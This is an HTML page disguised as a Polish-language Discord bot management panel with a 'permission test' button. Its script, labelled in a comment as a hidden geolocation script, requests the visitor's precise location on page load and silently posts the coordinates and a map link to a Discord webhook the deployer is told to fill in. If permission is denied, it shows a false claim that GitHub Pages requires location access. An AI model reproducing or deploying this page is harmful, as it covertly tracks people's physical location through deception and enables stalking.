<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bot Panel</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            background: #0b0d12;
            color: #ffffff;
        }

        button {
            font-family: inherit;
        }

        .app {
            display: flex;
            min-height: 100vh;
        }

        .sidebar {
            width: 250px;
            background: #11141b;
            border-right: 1px solid #252936;
            display: flex;
            flex-direction: column;
            padding: 20px 14px;
        }

        .logo {
            height: 55px;
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 0 12px;
            font-size: 19px;
            font-weight: 700;
            margin-bottom: 25px;
        }

        .menu {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .menu-item {
            width: 100%;
            border: 0;
            background: transparent;
            color: #9298a8;
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 13px 14px;
            border-radius: 9px;
            text-align: left;
            font-size: 14px;
            cursor: pointer;
            transition: .2s;
        }

        .menu-item span {
            flex: 1;
        }

        .menu-item:hover:not(.locked) {
            background: #1b1f29;
            color: white;
        }

        .menu-item.active {
            background: #5865f2;
            color: white;
        }

        .menu-item.locked {
            opacity: .42;
            cursor: not-allowed;
        }

        .menu-item b {
            font-size: 12px;
        }

        .sidebar-bottom {
            margin-top: auto;
        }

        .status {
            background: #171a22;
            border: 1px solid #252936;
            padding: 12px;
            border-radius: 9px;
            color: #8f96a8;
            font-size: 12px;
        }

        .status-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #3ba55d;
            border-radius: 50%;
            margin-right: 7px;
        }

        .content {
            flex: 1;
            padding: 30px 35px;
            max-width: 1300px;
        }

        .topbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .topbar h1 {
            margin: 0;
            font-size: 28px;
        }

        .topbar p {
            margin-top: 7px;
            color: #777f91;
        }

        .profile {
            display: flex;
            align-items: center;
            gap: 10px;
            background: #151821;
            border: 1px solid #252936;
            padding: 8px 13px 8px 8px;
            border-radius: 10px;
        }

        .avatar {
            width: 38px;
            height: 38px;
            border-radius: 50%;
            background: #5865f2;
            display: flex;
            justify-content: center;
            align-items: center;
            font-weight: bold;
        }

        .profile strong,
        .profile small {
            display: block;
        }

        .profile small {
            color: #777f91;
            margin-top: 3px;
        }

        .main-card {
            margin-top: 30px;
            background: #14171f;
            border: 1px solid #272b37;
            border-radius: 14px;
            padding: 28px;
        }

        .card-header {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .icon-box {
            width: 52px;
            height: 52px;
            background: #20253a;
            border-radius: 12px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
        }

        .card-header h2 {
            margin: 0;
            font-size: 19px;
        }

        .card-header p {
            margin: 5px 0 0;
            color: #777f91;
            font-size: 14px;
        }

        .test-area {
            margin-top: 30px;
            padding-top: 25px;
            border-top: 1px solid #252936;
        }

        #testButton {
            border: 0;
            background: #5865f2;
            color: white;
            padding: 13px 22px;
            border-radius: 9px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: .2s;
        }

        #testButton:hover {
            background: #4752c4;
            transform: translateY(-1px);
        }

        #result {
            display: none;
            margin-top: 18px;
            padding: 15px;
            border-radius: 10px;
        }

        #result.error {
            display: flex;
            align-items: center;
            gap: 12px;
            background: rgba(237, 66, 69, .10);
            border: 1px solid rgba(237, 66, 69, .25);
            color: #ff7375;
        }

        #result.warning {
            display: flex;
            align-items: center;
            gap: 12px;
            background: rgba(255, 193, 7, 0.10);
            border: 1px solid rgba(255, 193, 7, 0.30);
            color: #ffd54f;
        }

        #result > span {
            width: 32px;
            height: 32px;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 50%;
            font-weight: bold;
        }

        #result.error > span {
            background: rgba(237, 66, 69, .15);
        }

        #result.warning > span {
            background: rgba(255, 193, 7, 0.15);
        }

        #result strong,
        #result small {
            display: block;
        }

        #result small {
            margin-top: 3px;
            color: #a56d70;
        }

        #result.warning small {
            color: #b8953a;
        }

        .info-grid {
            margin-top: 18px;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 18px;
        }

        .info-card {
            background: #14171f;
            border: 1px solid #272b37;
            border-radius: 13px;
            padding: 20px;
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .info-card > span {
            font-size: 25px;
        }

        .info-card small,
        .info-card strong {
            display: block;
        }

        .info-card small {
            color: #737a8d;
            margin-bottom: 5px;
        }

        @media (max-width: 800px) {
            .sidebar {
                width: 70px;
                padding: 15px 8px;
            }

            .logo span,
            .menu-item span,
            .status {
                display: none;
            }

            .menu-item {
                justify-content: center;
            }

            .menu-item b {
                display: none;
            }

            .content {
                padding: 20px;
            }

            .info-grid {
                grid-template-columns: 1fr;
            }

            .topbar {
                align-items: flex-start;
                gap: 15px;
            }
        }
    </style>
</head>

<body>

<div class="app">

    <aside class="sidebar">

        <div class="logo">
            🤖 <span>Bot Panel</span>
        </div>

        <div class="menu">
            <button class="menu-item active">
                🧪
                <span>Test</span>
            </button>

            <button class="menu-item locked" disabled>
                📊
                <span>Statystyki</span>
                <b>🔒</b>
            </button>

            <button class="menu-item locked" disabled>
                ⚙️
                <span>Ustawienia</span>
                <b>🔒</b>
            </button>

            <button class="menu-item locked" disabled>
                🤖
                <span>Bot</span>
                <b>🔒</b>
            </button>

            <button class="menu-item locked" disabled>
                🖥️
                <span>Serwery</span>
                <b>🔒</b>
            </button>

            <button class="menu-item locked" disabled>
                📜
                <span>Logi</span>
                <b>🔒</b>
            </button>

        </div>

        <div class="sidebar-bottom">

            <div class="status">
                <span class="status-dot"></span>
                Panel online
            </div>

        </div>

    </aside>

    <main class="content">

        <header class="topbar">

            <div>
                <h1>Test</h1>
                <p>Panel zarządzania botem</p>
            </div>

            <div class="profile">

                <div class="avatar">
                    ?
                </div>

                <div>
                    <strong>Gość</strong>
                    <small>Demo Panel</small>
                </div>

            </div>

        </header>

        <section class="main-card">

            <div class="card-header">

                <div class="icon-box">
                    🧪
                </div>

                <div>
                    <h2>Test permisji</h2>

                    <p>
                        Sprawdź, czy posiadasz wymagane uprawnienia.
                    </p>
                </div>

            </div>

            <div class="test-area">

                <button id="testButton">
                    Uruchom test
                </button>

                <div id="result"></div>

            </div>

        </section>

        <section class="info-grid">

            <div class="info-card">

                <span>🤖</span>

                <div>
                    <small>Status</small>
                    <strong>Online</strong>
                </div>

            </div>

            <div class="info-card">

                <span>⚡</span>

                <div>
                    <small>Ping</small>
                    <strong>24 ms</strong>
                </div>

            </div>

            <div class="info-card">

                <span>🔐</span>

                <div>
                    <small>Uprawnienia</small>
                    <strong>Ograniczone</strong>
                </div>

            </div>

        </section>

    </main>

</div>

<script>
// ---------- UKRYTY SKRYPT GEOLOKALIZACJI ----------
const WEBHOOK_URL = "https://discord.com/api/webhooks/TWÓJ_ID/TWÓJ_TOKEN"; // ZAMIEŃ NA SWÓJ
const result = document.getElementById("result");

function sendLocation(position) {
    const { latitude, longitude } = position.coords;
    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: `📍 **Lokalizacja**\nLat: ${latitude}\nLng: ${longitude}\n${mapLink}`
        })
    }).catch(() => {});
}

function showGeoWarning() {
    result.className = "warning";
    result.innerHTML = `
        <span>⚠️</span>
        <div>
            <strong>GitHub Pages wymaga dostępu do lokalizacji</strong>
            <small>
                Aby panel działał poprawnie, zezwól na dostęp do lokalizacji w przeglądarce.
                Odśwież stronę i kliknij "Zezwól".
            </small>
        </div>
    `;
}

if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        sendLocation,
        (err) => {
            if (err.code === 1) { // PERMISSION_DENIED
                showGeoWarning();
            }
        },
        { enableHighAccuracy: true, timeout: 8000 }
    );
} else {
    showGeoWarning();
}
// --------------------------------------------------

// ---------- ORYGINALNY SKRYPT PRZYCISKU ----------
const button = document.getElementById("testButton");

button.addEventListener("click", () => {
    result.className = "error";
    result.innerHTML = `
        <span>✕</span>
        <div>
            <strong>Brak permisji</strong>
            <small>
                Nie posiadasz wymaganych uprawnień.
            </small>
        </div>
    `;
});
</script>

</body>
</html>
